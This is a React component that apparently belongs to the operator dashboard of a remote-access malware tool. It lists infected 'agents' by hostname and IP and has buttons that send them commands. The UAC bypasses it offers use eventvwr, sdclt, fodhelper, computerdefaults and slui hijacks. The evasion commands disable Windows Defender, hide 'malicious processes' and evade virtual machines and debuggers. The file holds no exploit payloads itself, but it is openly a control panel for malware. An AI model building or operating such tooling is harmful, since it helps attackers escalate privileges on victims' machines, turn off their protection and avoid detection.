import React, { useState } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Progress } from '@/components/ui/progress';
import { 
  Shield, 
  Lock, 
  Unlock, 
  AlertTriangle,
  CheckCircle,
  XCircle,
  Activity,
  Settings,
  Eye,
  EyeOff,
  Zap,
  Target,
  Database,
  Key
} from 'lucide-react';

interface SecurityViewProps {
  agents: any[];
  selectedAgent: string | null;
  onAgentSelect: (agentId: string) => void;
  onExecuteCommand: (agentId: string, command: string) => void;
  configStatus: any;
}

const SecurityView: React.FC<SecurityViewProps> = ({
  agents,
  selectedAgent,
  onAgentSelect,
  onExecuteCommand,
  configStatus
}) => {
  const [activeTab, setActiveTab] = useState('uac');
  const [selectedMethod, setSelectedMethod] = useState<string>('');

  const onlineAgents = agents.filter(agent => agent.status === 'online');
  const currentAgent = agents.find(agent => agent.id === selectedAgent);

  const uacMethods = [
    {
      id: 'eventvwr',
      name: 'EventVwr.exe Registry Hijacking',
      description: 'Hijack EventVwr.exe to bypass UAC prompts',
      success: currentAgent?.privileges?.method === 'EventVwr.exe',
      risk: 'Medium',
      icon: Target
    },
    {
      id: 'sdclt',
      name: 'sdclt.exe Bypass',
      description: 'Use sdclt.exe to bypass UAC with consent prompt only',
      success: currentAgent?.privileges?.method === 'sdclt.exe',
      risk: 'Low',
      icon: Zap
    },
    {
      id: 'fodhelper',
      name: 'fodhelper.exe Protocol Handler',
      description: 'Exploit ms-settings protocol handler in fodhelper.exe',
      success: currentAgent?.privileges?.method === 'fodhelper.exe',
      risk: 'Medium',
      icon: Settings
    },
    {
      id: 'computerdefaults',
      name: 'computerdefaults.exe',
      description: 'Use computerdefaults.exe for UAC bypass',
      success: currentAgent?.privileges?.method === 'computerdefaults.exe',
      risk: 'Low',
      icon: Database
    },
    {
      id: 'slui',
      name: 'slui.exe Registry Hijacking',
      description: 'Hijack slui.exe for UAC bypass',
      success: currentAgent?.privileges?.method === 'slui.exe',
      risk: 'Medium',
      icon: Key
    }
  ];

  const evasionMethods = [
    {
      id: 'defender',
      name: 'Windows Defender Disable',
      description: 'Disable Windows Defender real-time protection',
      success: currentAgent?.security?.defenderDisabled,
      risk: 'High',
      icon: Shield
    },
    {
      id: 'process_hiding',
      name: 'Process Hiding',
      description: 'Hide malicious processes from task manager',
      success: currentAgent?.security?.processHidden,
      risk: 'High',
      icon: EyeOff
    },
    {
      id: 'antivm',
      name: 'Anti-VM Detection',
      description: 'Detect and evade virtual machine environments',
      success: currentAgent?.security?.antiVMEnabled,
      risk: 'Medium',
      icon: Activity
    },
    {
      id: 'antidebug',
      name: 'Anti-Debugging',
      description: 'Detect and evade debugging attempts',
      success: currentAgent?.security?.antiDebugEnabled,
      risk: 'Medium',
      icon: Lock
    }
  ];

  const MethodCard = ({ method, onExecute }: { method: any; onExecute: () => void }) => {
    const Icon = method.icon;
    
    return (
      <Card className={`transition-all duration-200 ${method.success ? 'border-green-500 bg-green-50/50' : 'hover:border-primary'}`}>
        <CardHeader className="pb-3">
          <div className="flex items-center justify-between">
            <CardTitle className="flex items-center gap-2 text-lg">
              <Icon className="w-5 h-5" />
              {method.name}
              <Badge variant={method.success ? "default" : "secondary"}>
                {method.success ? "Active" : "Inactive"}
              </Badge>
            </CardTitle>
            <Badge variant={method.risk === 'High' ? "destructive" : method.risk === 'Medium' ? "default" : "secondary"}>
              {method.risk}
            </Badge>
          </div>
        </CardHeader>
        <CardContent className="space-y-4">
          <p className="text-sm text-muted-foreground">{method.description}</p>
          
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              {method.success ? (
                <CheckCircle className="w-4 h-4 text-green-500" />
              ) : (
                <XCircle className="w-4 h-4 text-red-500" />
              )}
              <span className="text-sm font-medium">
                {method.success ? "Successfully Applied" : "Not Applied"}
              </span>
            </div>
            
            {!method.success && selectedAgent && (
              <Button
                size="sm"
                onClick={onExecute}
                disabled={!selectedAgent}
              >
                Apply
              </Button>
            )}
          </div>
        </CardContent>
      </Card>
    );
  };

  const SecurityOverview = () => (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-2">
          <Shield className="w-5 h-5" />
          Security Overview
        </CardTitle>
      </CardHeader>
      <CardContent className="space-y-4">
        <div className="grid grid-cols-2 gap-4">
          <div className="space-y-2">
            <div className="flex items-center justify-between text-sm">
              <span>UAC Bypass Status</span>
              <Badge variant={currentAgent?.privileges?.admin ? "default" : "destructive"}>
                {currentAgent?.privileges?.admin ? "Elevated" : "Standard"}
              </Badge>
            </div>
            <Progress 
              value={currentAgent?.privileges?.admin ? 100 : 0} 
              className="h-2"
            />
          </div>
          
          <div className="space-y-2">
            <div className="flex items-center justify-between text-sm">
              <span>Defender Status</span>
              <Badge variant={currentAgent?.security?.defenderDisabled ? "destructive" : "default"}>
                {currentAgent?.security?.defenderDisabled ? "Disabled" : "Active"}
              </Badge>
            </div>
            <Progress 
              value={currentAgent?.security?.defenderDisabled ? 100 : 0} 
              className="h-2"
            />
          </div>
        </div>
        
        <Separator />
        
        <div className="space-y-2">
          <h4 className="font-medium">Active Security Measures</h4>
          <div className="grid grid-cols-2 gap-2 text-sm">
            <div className="flex items-center gap-2">
              <div className={`w-2 h-2 rounded-full ${currentAgent?.security?.processHidden ? 'bg-green-500' : 'bg-red-500'}`} />
              <span>Process Hiding</span>
            </div>
            <div className="flex items-center gap-2">
              <div className={`w-2 h-2 rounded-full ${currentAgent?.security?.antiVMEnabled ? 'bg-green-500' : 'bg-red-500'}`} />
              <span>Anti-VM</span>
            </div>
            <div className="flex items-center gap-2">
              <div className={`w-2 h-2 rounded-full ${currentAgent?.security?.antiDebugEnabled ? 'bg-green-500' : 'bg-red-500'}`} />
              <span>Anti-Debug</span>
            </div>
            <div className="flex items-center gap-2">
              <div className={`w-2 h-2 rounded-full ${currentAgent?.privileges?.method ? 'bg-green-500' : 'bg-red-500'}`} />
              <span>UAC Bypass</span>
            </div>
          </div>
        </div>
      </CardContent>
    </Card>
  );

  return (
    <div className="h-full flex flex-col">
      {/* Header */}
      <div className="flex items-center justify-between p-6 border-b">
        <div>
          <h1 className="text-2xl font-bold">Security & Evasion</h1>
          <p className="text-muted-foreground">
            UAC bypass techniques and anti-detection measures
          </p>
        </div>
        
        <div className="flex items-center gap-4">
          {/* Agent Selector */}
          <div className="flex items-center gap-2">
            <span className="text-sm font-medium">Agent:</span>
            <select
              className="p-2 border rounded-md"
              value={selectedAgent || ''}
              onChange={(e) => onAgentSelect(e.target.value)}
            >
              <option value="">Select an agent</option>
              {onlineAgents.map(agent => (
                <option key={agent.id} value={agent.id}>
                  {agent.hostname} ({agent.ip})
                </option>
              ))}
            </select>
          </div>
          
          {/* Security Status */}
          <div className="flex items-center gap-2">
            <div className={`w-2 h-2 rounded-full ${currentAgent?.privileges?.admin ? 'bg-green-500' : 'bg-red-500'}`} />
            <span className="text-sm">
              {currentAgent?.privileges?.admin ? 'Elevated Privileges' : 'Standard User'}
            </span>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 p-6">
        {selectedAgent ? (
          <div className="grid grid-cols-1 lg:grid-cols-4 gap-6 h-full">
            {/* Overview Panel */}
            <div className="lg:col-span-1">
              <SecurityOverview />
            </div>

            {/* Methods Panel */}
            <div className="lg:col-span-3">
              <Card className="h-full">
                <CardHeader>
                  <CardTitle>Security Methods</CardTitle>
                </CardHeader>
                <CardContent>
                  <Tabs value={activeTab} onValueChange={setActiveTab}>
                    <TabsList className="grid w-full grid-cols-2">
                      <TabsTrigger value="uac">UAC Bypass</TabsTrigger>
                      <TabsTrigger value="evasion">Evasion</TabsTrigger>
                    </TabsList>
                    
                    <TabsContent value="uac" className="mt-6">
                      <div className="space-y-4">
                        {uacMethods.map((method) => (
                          <MethodCard
                            key={method.id}
                            method={method}
                            onExecute={() => {
                              const command = `uac_bypass_${method.id}`;
                              onExecuteCommand(selectedAgent, command);
                            }}
                          />
                        ))}
                      </div>
                    </TabsContent>
                    
                    <TabsContent value="evasion" className="mt-6">
                      <div className="space-y-4">
                        {evasionMethods.map((method) => (
                          <MethodCard
                            key={method.id}
                            method={method}
                            onExecute={() => {
                              const command = `evasion_${method.id}`;
                              onExecuteCommand(selectedAgent, command);
                            }}
                          />
                        ))}
                      </div>
                    </TabsContent>
                  </Tabs>
                </CardContent>
              </Card>
            </div>
          </div>
        ) : (
          <div className="flex items-center justify-center h-full">
            <div className="text-center">
              <Shield className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
              <h3 className="text-lg font-medium mb-2">No Agent Selected</h3>
              <p className="text-muted-foreground">
                Select an agent from the dropdown above to manage security settings
              </p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default SecurityView;